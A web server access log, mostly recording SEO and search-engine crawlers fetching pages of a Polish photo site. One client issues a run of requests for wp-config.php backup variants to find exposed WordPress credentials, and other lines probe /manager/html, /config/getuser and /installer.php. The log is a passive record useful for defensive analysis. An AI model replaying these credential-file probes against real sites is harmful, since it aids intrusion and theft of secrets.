185.191.171.33 - - [18/Sep/2020:13:35:48 +0100] "GET /dane/dane/prz3/pp13/foto/foto07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.169 - - [18/Sep/2020:13:36:58 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.137.177 - - [18/Sep/2020:13:38:38 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
185.191.171.33 - - [18/Sep/2020:13:41:45 +0100] "GET /dane/dane/prz6/wislica/foto/foto11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.2 - - [18/Sep/2020:13:43:18 +0100] "GET /dane/dane/prz2/dalej/pp28/foto/08.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.26 - - [18/Sep/2020:13:47:26 +0100] "GET /dane/dane/prz6/podzamcze/foto/pod07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.79 - - [18/Sep/2020:13:51:20 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd06.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
3.233.220.184 - - [18/Sep/2020:13:53:31 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
103.216.236.30 - - [18/Sep/2020:13:55:15 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.191.171.25 - - [18/Sep/2020:13:59:55 +0100] "GET /dane/dane/prz4/p4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
179.99.174.149 - - [18/Sep/2020:14:01:19 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
114.119.156.250 - - [18/Sep/2020:14:05:08 +0100] "GET /dane/dane/prz5/mini10.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.191 - - [18/Sep/2020:14:06:08 +0100] "GET /dane/dane/prz2/pp14/foto/foto1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.22 - - [18/Sep/2020:14:08:35 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.25 - - [18/Sep/2020:14:08:36 +0100] "GET /dane/dane/prz6/checiny/foto/foto02.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.4 - - [18/Sep/2020:14:13:59 +0100] "GET /dane/dane/prz3/pp9/foto/foto07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
194.146.24.53 - - [18/Sep/2020:14:15:58 +0100] "POST /wp-cron.php?doing_wp_cron=1600434958.4475889205932617187500 HTTP/1.1" 200 31 "http://ipmad.mztel.net/wp-cron.php?doing_wp_cron=1600434958.4475889205932617187500" "WordPress/5.5.1; https://ipmad.mztel.net"
185.220.101.144 - - [18/Sep/2020:14:15:58 +0100] "GET /wp-config.php.@ HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:15:59 +0100] "GET /wp-config.php.# HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:15:59 +0100] "GET /wp-config.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:00 +0100] "GET /wp-config.php# HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:01 +0100] "GET /wp-configfix HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:02 +0100] "GET /wp-configphp HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:03 +0100] "GET /wp-config_php HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:04 +0100] "GET /wp-config.php.at HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:05 +0100] "GET /wp-config.php.se HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:07 +0100] "GET /wp-config.php.br HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:08 +0100] "GET /wp-config.php2020 HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:09 +0100] "GET /wp-config.php.s HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:10 +0100] "GET /wp-config_old_old HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:12 +0100] "GET /wp-config-old-old HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:13 +0100] "GET /wp-config1 HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.220.101.144 - - [18/Sep/2020:14:16:14 +0100] "GET /wp-config2 HTTP/1.1" 404 21918 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.191.171.34 - - [18/Sep/2020:14:16:35 +0100] "GET /dane/dane/prz2/dalej/pp21/foto/foto04.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [18/Sep/2020:14:18:35 +0100] "GET /dane/dane/prz4/pp4/foto/foto07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
66.249.75.23 - - [18/Sep/2020:14:19:33 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.23 - - [18/Sep/2020:14:19:34 +0100] "GET /dane/dane/prz2/pp3/foto/foto03.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.148.82 - - [18/Sep/2020:14:21:01 +0100] "GET /dane/dane/prz2/dalej/pp24/foto/08.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.148.10.28 - - [18/Sep/2020:14:22:50 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
114.119.142.126 - - [18/Sep/2020:14:23:40 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
162.243.128.193 - - [18/Sep/2020:14:31:28 +0100] "GET /manager/html HTTP/1.1" 301 185 "-" "Mozilla/5.0 zgrab/0.x"
54.36.148.191 - - [18/Sep/2020:14:35:34 +0100] "GET /dane/dane/prz6/chroberz/chroberz.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.157.156 - - [18/Sep/2020:14:38:46 +0100] "GET /dane/dane/prz2/p2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
66.249.69.119 - - [18/Sep/2020:14:39:49 +0100] "GET /dane/dane/prz5/mini39.JPG HTTP/1.1" 301 185 "-" "Googlebot-Image/1.0"
114.119.149.233 - - [18/Sep/2020:14:46:50 +0100] "GET /dane/dane/prz7/mini05e.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.191 - - [18/Sep/2020:14:50:23 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
192.35.168.250 - - [18/Sep/2020:14:51:31 +0100] "GET / HTTP/1.1" 301 185 "-" "-"
192.35.168.250 - - [18/Sep/2020:14:51:31 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
114.119.151.174 - - [18/Sep/2020:14:54:41 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
52.36.107.34 - - [18/Sep/2020:14:54:52 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
114.119.140.217 - - [18/Sep/2020:15:04:43 +0100] "GET /dane/dane/prz6/podzamcze/mini13.jpg HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.191 - - [18/Sep/2020:15:05:04 +0100] "GET /dane/dane/prz2/dalej/pp24/foto/09.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.34 - - [18/Sep/2020:15:14:26 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [18/Sep/2020:15:14:27 +0100] "GET /dane/dane/prz3/pp15/foto/p06.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
78.85.251.4 - - [18/Sep/2020:15:15:02 +0100] "GET /installer.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
54.36.148.191 - - [18/Sep/2020:15:20:09 +0100] "GET /dane/dane/prz2/pp10/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
62.210.143.6 - - [18/Sep/2020:15:26:35 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:35 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:40 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:40 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
114.119.156.250 - - [18/Sep/2020:15:26:42 +0100] "GET /dane/dane/prz4/pp11/pp11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
62.210.143.6 - - [18/Sep/2020:15:26:46 +0100] "GET /dane/pierwsza.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:46 +0100] "GET /dane/pierwsza.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:51 +0100] "GET /dane/pierwsza.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:51 +0100] "GET /dane/pierwsza.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:56 +0100] "GET /dane/dane/prz1/p1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:26:56 +0100] "GET /dane/dane/prz1/p1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:01 +0100] "GET /index_pliki/editdata.mso HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:01 +0100] "GET /index_pliki/editdata.mso HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:06 +0100] "GET /dane/dane/prz4/p4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:06 +0100] "GET /dane/dane/prz4/p4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:11 +0100] "GET /dane/dane/prz3/p3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:11 +0100] "GET /dane/dane/prz3/p3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:16 +0100] "GET /dane/dane/prz2/p2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:17 +0100] "GET /dane/dane/prz2/p2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:22 +0100] "GET /dane/dane/prz5/p5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:22 +0100] "GET /dane/dane/prz5/p5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:27 +0100] "GET /dane/dane/prz7/p7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:27 +0100] "GET /dane/dane/prz7/p7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:32 +0100] "GET /dane/dane/prz9/p9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:32 +0100] "GET /dane/dane/prz9/p9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:37 +0100] "GET /dane/dane/prz8/p8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:37 +0100] "GET /dane/dane/prz8/p8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:42 +0100] "GET /dane/dane/prz6/ciekawe.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:42 +0100] "GET /dane/dane/prz6/ciekawe.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:47 +0100] "GET /dane/dane/prz6/staro/staro.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:48 +0100] "GET /dane/dane/prz6/staro/staro.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:53 +0100] "GET /dane/dane/prz4/pp4/pp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:53 +0100] "GET /dane/dane/prz4/pp4/pp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:58 +0100] "GET /dane/dane/prz4/pp8/pp8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:27:58 +0100] "GET /dane/dane/prz4/pp8/pp8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:03 +0100] "GET /dane/dane/prz4/pp2/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:03 +0100] "GET /dane/dane/prz4/pp2/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:08 +0100] "GET /dane/dane/prz4/pp5/pp5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:08 +0100] "GET /dane/dane/prz4/pp5/pp5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:13 +0100] "GET /dane/dane/prz4/pp7/pp7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:13 +0100] "GET /dane/dane/prz4/pp7/pp7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:18 +0100] "GET /dane/dane/prz4/pp6/pp6.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:18 +0100] "GET /dane/dane/prz4/pp6/pp6.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:23 +0100] "GET /dane/dane/prz4/pp1/pp1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:23 +0100] "GET /dane/dane/prz4/pp1/pp1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:28 +0100] "GET /dane/dane/prz4/pp9/pp9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:29 +0100] "GET /dane/dane/prz4/pp9/pp9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:34 +0100] "GET /dane/dane/prz4/pp3/pp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:34 +0100] "GET /dane/dane/prz4/pp3/pp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:39 +0100] "GET /dane/dane/prz3/pp4/pp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:39 +0100] "GET /dane/dane/prz3/pp4/pp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:44 +0100] "GET /dane/dane/prz3/pp8/pp8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:44 +0100] "GET /dane/dane/prz3/pp8/pp8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:49 +0100] "GET /dane/dane/prz3/pp2/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:49 +0100] "GET /dane/dane/prz3/pp2/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:54 +0100] "GET /dane/dane/prz3/pp5/pp5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:54 +0100] "GET /dane/dane/prz3/pp5/pp5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:59 +0100] "GET /dane/dane/prz3/pp7/pp7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:28:59 +0100] "GET /dane/dane/prz3/pp7/pp7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:04 +0100] "GET /dane/dane/prz3/pp6/pp6.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:04 +0100] "GET /dane/dane/prz3/pp6/pp6.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:09 +0100] "GET /dane/dane/prz3/pp1/pp1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:09 +0100] "GET /dane/dane/prz3/pp1/pp1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:14 +0100] "GET /dane/dane/prz3/pp9/pp9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:14 +0100] "GET /dane/dane/prz3/pp9/pp9.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:19 +0100] "GET /dane/dane/prz3/pp3/pp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:19 +0100] "GET /dane/dane/prz3/pp3/pp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:24 +0100] "GET /dane/dane/prz2/pp9/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:25 +0100] "GET /dane/dane/prz2/pp9/pp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
